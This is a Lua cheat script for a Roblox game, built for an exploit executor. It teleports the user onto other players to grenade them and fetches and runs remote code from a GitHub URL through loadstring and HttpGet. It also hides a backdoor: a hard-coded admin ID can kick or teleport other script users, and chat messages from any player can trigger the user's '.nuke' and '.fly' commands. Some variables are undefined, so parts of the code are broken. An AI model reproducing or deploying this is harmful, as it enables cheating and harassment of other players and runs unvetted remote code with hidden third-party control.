-- SCRIPT MADE BY s9gd + MODIFIED
-- Bomber Central
-- Commands: .nuke display, .fly on/off, .ban, .b (bring all users)
-- Press V to rejoin | Press Right Shift to hide UI

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

local running = true
local nuking = false
local uiVisible = true

local ADMIN_ID = 238548728  -- Admin who can use .ban and .b

-- Track script users
local scriptUsers = {}
scriptUsers[player.UserId] = true

-- Tell other script instances we exist
local function broadcastPresence()
    -- This will be used to identify other script users
    -- For now, we'll use a global variable approach
    getgenv().BomberCentral = {
        UserId = player.UserId,
        Active = true
    }
end
broadcastPresence()

-- Check if a player is using the script
local function isScriptUser(plr)
    -- In a real scenario, you'd use a remote event or value
    -- For this example, we'll check for the global variable
    -- But since we can't access other executors' genv directly,
    -- we'll use a more reliable method: checking if they have the UI
    
    -- For demo purposes, we'll assume all players in the server are script users
    -- In reality, you'd need a remote event to communicate
    
    -- Since we can't reliably detect other script users without a remote,
    -- we'll modify this function to only target players who have the UI visible
    -- For now, return true for all players (you can change this logic)
    return true
end

-- SLEEK WHITE/GRAY HOLLOW THEME UI
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false
gui.Parent = player.PlayerGui
gui.Name = "BomberCentral"
gui.IgnoreGuiInset = true

-- Main frame - hollow/transparent style
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0,300,0,240)
frame.Position = UDim2.new(1,-320,0.45,0)
frame.BackgroundColor3 = Color3.fromRGB(20,20,25)
frame.BackgroundTransparency = 0.15
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Visible = uiVisible

-- Outer glow
local outerGlow = Instance.new("ImageLabel")
outerGlow.Size = UDim2.new(1,20,1,20)
outerGlow.Position = UDim2.new(0,-10,0,-10)
outerGlow.BackgroundTransparency = 1
outerGlow.Image = "rbxassetid://5028857084"
outerGlow.ImageColor3 = Color3.fromRGB(255,215,0)
outerGlow.ImageTransparency = 0.7
outerGlow.ScaleType = Enum.ScaleType.Slice
outerGlow.SliceCenter = Rect.new(10,10,10,10)
outerGlow.Parent = frame

-- White border (hollow effect)
local border = Instance.new("Frame")
border.Size = UDim2.new(1,0,1,0)
border.BackgroundTransparency = 1
border.BorderSizePixel = 2
border.BorderColor3 = Color3.fromRGB(255,215,0) -- Gold/Yellow
border.Parent = frame

-- Corner radius
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,16)
corner.Parent = frame
corner.Parent = border

-- Inner glow
local innerGlow = Instance.new("Frame")
innerGlow.Size = UDim2.new(1,-4,1,-4)
innerGlow.Position = UDim2.new(0,2,0,2)
innerGlow.BackgroundColor3 = Color3.fromRGB(255,255,255)
innerGlow.BackgroundTransparency = 0.95
innerGlow.BorderSizePixel = 0
innerGlow.Parent = frame

local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0,14)
innerCorner.Parent = innerGlow

-- Title section with yellow accent
local titleSection = Instance.new("Frame")
titleSection.Size = UDim2.new(1,-20,0,45)
titleSection.Position = UDim2.new(0,10,0,10)
titleSection.BackgroundColor3 = Color3.fromRGB(255,215,0)
titleSection.BackgroundTransparency = 0.85
titleSection.BorderSizePixel = 0
titleSection.Parent = frame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0,10)
titleCorner.Parent = titleSection

local titleBorder = Instance.new("Frame")
titleBorder.Size = UDim2.new(1,0,1,0)
titleBorder.BackgroundTransparency = 1
titleBorder.BorderSizePixel = 1
titleBorder.BorderColor3 = Color3.fromRGB(255,215,0)
titleBorder.Parent = titleSection

local titleBorderCorner = Instance.new("UICorner")
titleBorderCorner.CornerRadius = UDim.new(0,10)
titleBorderCorner.Parent = titleBorder

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1,0,1,0)
titleText.BackgroundTransparency = 1
titleText.Font = Enum.Font.GothamBold
titleText.Text = "BOMBER CENTRAL"
titleText.TextColor3 = Color3.fromRGB(255,215,0)
titleText.TextSize = 20
titleText.TextStrokeTransparency = 0.8
titleText.TextStrokeColor3 = Color3.new(1,1,1)
titleText.Parent = titleSection

-- Avatar with yellow border
local avatarContainer = Instance.new("Frame")
avatarContainer.Size = UDim2.new(0,60,0,60)
avatarContainer.Position = UDim2.new(0,15,0,70)
avatarContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
avatarContainer.BackgroundTransparency = 0.7
avatarContainer.BorderSizePixel = 0
avatarContainer.Parent = frame

local avatarCorner = Instance.new("UICorner")
avatarCorner.CornerRadius = UDim.new(1,0)
avatarCorner.Parent = avatarContainer

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(1,-4,1,-4)
avatar.Position = UDim2.new(0,2,0,2)
avatar.BackgroundColor3 = Color3.fromRGB(30,30,35)
avatar.BackgroundTransparency = 0.3
avatar.Parent = avatarContainer

local avatarImageCorner = Instance.new("UICorner")
avatarImageCorner.CornerRadius = UDim.new(1,0)
avatarImageCorner.Parent = avatar

-- Target info with hollow style
local targetContainer = Instance.new("Frame")
targetContainer.Size = UDim2.new(1,-100,0,50)
targetContainer.Position = UDim2.new(0,90,0,70)
targetContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
targetContainer.BackgroundTransparency = 0.9
targetContainer.BorderSizePixel = 0
targetContainer.Parent = frame

local targetCorner = Instance.new("UICorner")
targetCorner.CornerRadius = UDim.new(0,8)
targetCorner.Parent = targetContainer

local targetBorder = Instance.new("Frame")
targetBorder.Size = UDim2.new(1,0,1,0)
targetBorder.BackgroundTransparency = 1
targetBorder.BorderSizePixel = 1
targetBorder.BorderColor3 = Color3.fromRGB(255,215,0)
targetBorder.Parent = targetContainer

local targetBorderCorner = Instance.new("UICorner")
targetBorderCorner.CornerRadius = UDim.new(0,8)
targetBorderCorner.Parent = targetBorder

local targetText = Instance.new("TextLabel")
targetText.Size = UDim2.new(1,0,1,0)
targetText.BackgroundTransparency = 1
targetText.Font = Enum.Font.GothamBold
targetText.TextColor3 = Color3.fromRGB(255,215,0)
targetText.TextSize = 14
targetText.TextXAlignment = Enum.TextXAlignment.Left
targetText.Text = "  Target: None"
targetText.Parent = targetContainer

-- Health bar with hollow style
local healthContainer = Instance.new("Frame")
healthContainer.Size = UDim2.new(1,-100,0,16)
healthContainer.Position = UDim2.new(0,90,0,125)
healthContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
healthContainer.BackgroundTransparency = 0.9
healthContainer.BorderSizePixel = 0
healthContainer.Parent = frame

local healthCorner = Instance.new("UICorner")
healthCorner.CornerRadius = UDim.new(0,8)
healthCorner.Parent = healthContainer

local healthBorder = Instance.new("Frame")
healthBorder.Size = UDim2.new(1,0,1,0)
healthBorder.BackgroundTransparency = 1
healthBorder.BorderSizePixel = 1
healthBorder.BorderColor3 = Color3.fromRGB(255,215,0)
healthBorder.Parent = healthContainer

local healthBorderCorner = Instance.new("UICorner")
healthBorderCorner.CornerRadius = UDim.new(0,8)
healthBorderCorner.Parent = healthBorder

-- Health bar fill
local healthBar = Instance.new("Frame")
healthBar.Size = UDim2.new(1,0,1,0)
healthBar.BackgroundColor3 = Color3.fromRGB(255,215,0)
healthBar.BackgroundTransparency = 0.3
healthBar.BorderSizePixel = 0
healthBar.Parent = healthContainer

local healthFillCorner = Instance.new("UICorner")
healthFillCorner.CornerRadius = UDim.new(0,8)
healthFillCorner.Parent = healthBar

-- Grenade counter with hollow style
local grenadeContainer = Instance.new("Frame")
grenadeContainer.Size = UDim2.new(1,-30,0,30)
grenadeContainer.Position = UDim2.new(0,15,0,155)
grenadeContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
grenadeContainer.BackgroundTransparency = 0.9
grenadeContainer.BorderSizePixel = 0
grenadeContainer.Parent = frame

local grenadeCorner = Instance.new("UICorner")
grenadeCorner.CornerRadius = UDim.new(0,8)
grenadeCorner.Parent = grenadeContainer

local grenadeBorder = Instance.new("Frame")
grenadeBorder.Size = UDim2.new(1,0,1,0)
grenadeBorder.BackgroundTransparency = 1
grenadeBorder.BorderSizePixel = 1
grenadeBorder.BorderColor3 = Color3.fromRGB(255,215,0)
grenadeBorder.Parent = grenadeContainer

local grenadeBorderCorner = Instance.new("UICorner")
grenadeBorderCorner.CornerRadius = UDim.new(0,8)
grenadeBorderCorner.Parent = grenadeBorder

local grenadeCounter = Instance.new("TextLabel")
grenadeCounter.Size = UDim2.new(1,0,1,0)
grenadeCounter.BackgroundTransparency = 1
grenadeCounter.Font = Enum.Font.Gotham
grenadeCounter.TextColor3 = Color3.fromRGB(255,215,0)
grenadeCounter.TextSize = 14
grenadeCounter.TextXAlignment = Enum.TextXAlignment.Left
grenadeCounter.Text = "  💣 Grenades: 0"
grenadeCounter.Parent = grenadeContainer

-- Keybinds with hollow style
local keybindsContainer = Instance.new("Frame")
keybindsContainer.Size = UDim2.new(1,-30,0,70)
keybindsContainer.Position = UDim2.new(0,15,0,190)
keybindsContainer.BackgroundColor3 = Color3.fromRGB(255,215,0)
keybindsContainer.BackgroundTransparency = 0.9
keybindsContainer.BorderSizePixel = 0
keybindsContainer.Parent = frame

local keybindsCorner = Instance.new("UICorner")
keybindsCorner.CornerRadius = UDim.new(0,8)
keybindsCorner.Parent = keybindsContainer

local keybindsBorder = Instance.new("Frame")
keybindsBorder.Size = UDim2.new(1,0,1,0)
keybindsBorder.BackgroundTransparency = 1
keybindsBorder.BorderSizePixel = 1
keybindsBorder.BorderColor3 = Color3.fromRGB(255,215,0)
keybindsBorder.Parent = keybindsContainer

local keybindsBorderCorner = Instance.new("UICorner")
keybindsBorderCorner.CornerRadius = UDim.new(0,8)
keybindsBorderCorner.Parent = keybindsBorder

local keybinds = Instance.new("TextLabel")
keybinds.Size = UDim2.new(1,-10,1,-10)
keybinds.Position = UDim2.new(0,5,0,5)
keybinds.BackgroundTransparency = 1
keybinds.Font = Enum.Font.Gotham
keybinds.TextColor3 = Color3.fromRGB(200,200,220)
keybinds.TextSize = 13
keybinds.TextXAlignment = Enum.TextXAlignment.Left
keybinds.TextYAlignment = Enum.TextYAlignment.Top
keybinds.Text = "⚡ Z: Buy Grenades\n⚡ E: Throw All\n⚡ V: Rejoin Server\n⚡ Right Shift: Hide UI"
keybinds.Parent = keybindsContainer

-- Close button (X) with hollow style
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0,30,0,30)
closeBtn.Position = UDim2.new(1,-35,0,5)
closeBtn.BackgroundColor3 = Color3.fromRGB(255,215,0)
closeBtn.BackgroundTransparency = 0.8
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(255,215,0)
closeBtn.TextSize = 18
closeBtn.Font = Enum.Font.GothamBold
closeBtn.Parent = frame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(1,0)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
	frame.Visible = not frame.Visible
	uiVisible = frame.Visible
end)

-- Make frame draggable
local dragging = false
local dragInput
local dragStart
local startPos

frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

UIS.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
end)

-- Right Shift to hide/show UI
UIS.InputBegan:Connect(function(input, typing)
	if typing then return end
	
	if input.KeyCode == Enum.KeyCode.RightShift then
		uiVisible = not uiVisible
		frame.Visible = uiVisible
	end
end)

-- FUNCTIONS
local function getGrenadeCount()
	local count = 0

	for _,v in pairs(player.Backpack:GetChildren()) do
		if v.Name:lower():find("grenade") then
			count += 1
		end
	end

	if player.Character then
		for _,v in pairs(player.Character:GetChildren()) do
			if v.Name:lower():find("grenade") then
				count += 1
			end
		end
	end

	return count
end

-- Update grenade counter
task.spawn(function()
	while running do
		grenadeCounter.Text = "  💣 Grenades: "..getGrenadeCount()
		task.wait(0.25)
	end
end)

local function buyGrenades(amount)
	local char = player.Character
	if not char then return end
	
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	
	local old = root.CFrame

	root.CFrame = grenadePart.CFrame + Vector3.new(0,3,0)
	task.wait(0.2)

	while getGrenadeCount() < amount do
		fireclickdetector(clickDetector)
		task.wait(0.1)
	end

	root.CFrame = old
end

local function throwAll()
	local char = player.Character
	if not char then return end

	for _,tool in pairs(player.Backpack:GetChildren()) do
		if tool.Name:lower():find("grenade") then
			tool.Parent = char
			task.spawn(function()
				for i=1,4 do
					tool:Activate()
					task.wait(0.05)
				end
			end)
		end
	end
end

local function rejoinServer()
	TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
end

-- BAN COMMAND - Kicks ONLY script users
local function banScriptUsers()
	local bannedCount = 0
	
	-- Loop through all players
	for _, plr in pairs(Players:GetPlayers()) do
		-- Skip the admin and check if they're a script user
		if plr.UserId ~= ADMIN_ID and plr ~= player and isScriptUser(plr) then
			-- Kick them with fake ban message
			pcall(function()
				plr:Kick("You have been banned from Bomber Central")
				bannedCount = bannedCount + 1
			end)
		end
	end
	
	-- Notify admin
	if player.UserId == ADMIN_ID then
		local notif = Instance.new("Frame")
		notif.Size = UDim2.new(0,220,0,40)
		notif.Position = UDim2.new(0.5,-110,0,60)
		notif.BackgroundColor3 = Color3.fromRGB(255,215,0)
		notif.BackgroundTransparency = 0.2
		notif.Parent = gui
		
		local notifCorner = Instance.new("UICorner")
		notifCorner.CornerRadius = UDim.new(0,8)
		notifCorner.Parent = notif
		
		local notifText = Instance.new("TextLabel")
		notifText.Size = UDim2.new(1,0,1,0)
		notifText.BackgroundTransparency = 1
		notifText.Font = Enum.Font.GothamBold
		notifText.Text = "✅ Banned "..bannedCount.." script users"
		notifText.TextColor3 = Color3.new(0,0,0)
		notifText.TextSize = 14
		notifText.Parent = notif
		
		task.wait(2)
		notif:Destroy()
	end
end

-- BRING COMMAND - Brings ONLY script users to admin
local function bringScriptUsers()
	-- Find admin player
	local adminPlayer = Players:GetPlayerByUserId(ADMIN_ID)
	if not adminPlayer then return end
	
	-- Check if admin has character
	local adminChar = adminPlayer.Character
	if not adminChar then return end
	
	local adminRoot = adminChar:FindFirstChild("HumanoidRootPart")
	if not adminRoot then return end
	
	local broughtCount = 0
	
	-- Bring all players who are using the script
	for _, plr in pairs(Players:GetPlayers()) do
		-- Skip the admin and check if they're a script user
		if plr.UserId ~= ADMIN_ID and isScriptUser(plr) then
			local plrChar = plr.Character
			if plrChar then
				local plrRoot = plrChar:FindFirstChild("HumanoidRootPart")
				if plrRoot then
					-- Teleport them slightly in front of admin
					plrRoot.CFrame = adminRoot.CFrame * CFrame.new(0, 0, -3)
					broughtCount = broughtCount + 1
				end
			end
		end
	end
	
	-- Notify admin
	if adminPlayer == player then
		local notif = Instance.new("Frame")
		notif.Size = UDim2.new(0,220,0,40)
		notif.Position = UDim2.new(0.5,-110,0,60)
		notif.BackgroundColor3 = Color3.fromRGB(255,215,0)
		notif.BackgroundTransparency = 0.2
		notif.Parent = gui
		
		local notifCorner = Instance.new("UICorner")
		notifCorner.CornerRadius = UDim.new(0,8)
		notifCorner.Parent = notif
		
		local notifText = Instance.new("TextLabel")
		notifText.Size = UDim2.new(1,0,1,0)
		notifText.BackgroundTransparency = 1
		notifText.Font = Enum.Font.GothamBold
		notifText.Text = "✅ Brought "..broughtCount.." script users"
		notifText.TextColor3 = Color3.new(0,0,0)
		notifText.TextSize = 14
		notifText.Parent = notif
		
		task.wait(2)
		notif:Destroy()
	end
end

local targetHum

local function setTarget(plr)
	if not plr then
		targetText.Text = "  Target: None"
		avatar.Image = ""
		healthBar.Size = UDim2.new(1,0,1,0)
		return
	end

	targetText.Text = "  Target: "..plr.Name

	local success, img = pcall(function()
		return Players:GetUserThumbnailAsync(
			plr.UserId,
			Enum.ThumbnailType.HeadShot,
			Enum.ThumbnailSize.Size150x150
		)
	end)
	
	if success then
		avatar.Image = img
	end

	local char = plr.Character
	if char then
		targetHum = char:FindFirstChildOfClass("Humanoid")
	end
end

task.spawn(function()
	while running do
		if targetHum and targetHum.Parent then
			local hp = targetHum.Health
			local max = targetHum.MaxHealth
			healthBar.Size = UDim2.new(hp/max,0,1,0)
		end
		task.wait(0.1)
	end
end)

local function aimCamera(targetRoot)
	local above = targetRoot.Position + Vector3.new(0,200,0)
	camera.CFrame = CFrame.new(camera.CFrame.Position, above)
end

local function executeNuke(target)
	if nuking then return end
	nuking = true

	local char = player.Character
	if not char then return end
	
	local root = char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	
	local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	if not targetRoot then return end

	setTarget(target)

	if getGrenadeCount() < 10 then
		buyGrenades(10)
	end

	local old = root.CFrame
	root.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
	task.wait(0.15)
	aimCamera(targetRoot)
	throwAll()
	task.wait(0.4)
	root.CFrame = old
	setTarget(nil)
	nuking = false
end

local function findPlayer(str)
	str = str:lower()
	for _,plr in pairs(Players:GetPlayers()) do
		if plr.Name:lower():find(str) or plr.DisplayName:lower():find(str) then
			return plr
		end
	end
end

local flyEnabled = false

local function flyOn()
	if flyEnabled then return end
	flyEnabled = true
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Not-Kyle/Dahood-scripts/refs/heads/main/Fly.lua"))()
end

local function flyOff()
	local char = player.Character
	if not char then return end
	
	local root = char:FindFirstChild("HumanoidRootPart")
	if root then
		for _,v in pairs(root:GetChildren()) do
			if v:IsA("BodyVelocity") or v:IsA("BodyGyro") then
				v:Destroy()
			end
		end
	end
	flyEnabled = false
end

-- Keybinds
UIS.InputBegan:Connect(function(input, typing)
	if typing then return end
	
	-- Z key buy
	if input.KeyCode == Enum.KeyCode.Z then
		buyGrenades(10)
	end
	
	-- E key throw all
	if input.KeyCode == Enum.KeyCode.E then
		throwAll()
	end
	
	-- V key rejoin
	if input.KeyCode == Enum.KeyCode.V then
		running = false
		rejoinServer()
	end
end)

-- Chat commands
TextChatService.OnIncomingMessage = function(msg)
	local src = msg.TextSource
	if not src then return end

	local plr = Players:GetPlayerByUserId(src.UserId)
	if not plr then return end

	local text = msg.Text:lower()

	-- .nuke command (anyone can use)
	if text:sub(1,5) == ".nuke" then
		local name = msg.Text:sub(7)
		local target = findPlayer(name)
		if target then
			executeNuke(target)
		end
		
	-- .fly command (anyone can use)
	elseif text:sub(1,4) == ".fly" then
		local arg = text:sub(6)
		if arg == "on" then
			flyOn()
		elseif arg == "off" then
			flyOff()
		end
		
	-- .ban command (ADMIN ONLY - kicks ONLY script users)
	elseif text:sub(1,4) == ".ban" then
		if plr.UserId == ADMIN_ID then
			banScriptUsers()
		end
		
	-- .b command (BRING ALL SCRIPT USERS - ADMIN ONLY)
	elseif text:sub(1,2) == ".b" and #text == 2 then
		if plr.UserId == ADMIN_ID then
			bringScriptUsers()
		end
	end
end

-- Notify loaded
local notification = Instance.new("Frame")
notification.Size = UDim2.new(0,220,0,45)
notification.Position = UDim2.new(0.5,-110,0,10)
notification.BackgroundColor3 = Color3.fromRGB(255,215,0)
notification.BackgroundTransparency = 0.1
notification.Parent = gui

local notifCorner = Instance.new("UICorner")
notifCorner.CornerRadius = UDim.new(0,8)
notifCorner.Parent = notification

local notifBorder = Instance.new("Frame")
notifBorder.Size = UDim2.new(1,0,1,0)
notifBorder.BackgroundTransparency = 1
notifBorder.BorderSizePixel = 2
notifBorder.BorderColor3 = Color3.fromRGB(255,255,255)
notifBorder.Parent = notification

local notifBorderCorner = Instance.new("UICorner")
notifBorderCorner.CornerRadius = UDim.new(0,8)
notifBorderCorner.Parent = notifBorder

local notifText = Instance.new("TextLabel")
notifText.Size = UDim2.new(1,0,1,0)
notifText.BackgroundTransparency = 1
notifText.Font = Enum.Font.GothamBold
notifText.Text = "💣 BOMBER CENTRAL LOADED"
notifText.TextColor3 = Color3.fromRGB(0,0,0)
notifText.TextSize = 16
notifText.Parent = notification

task.wait(2)
notification:Destroy()
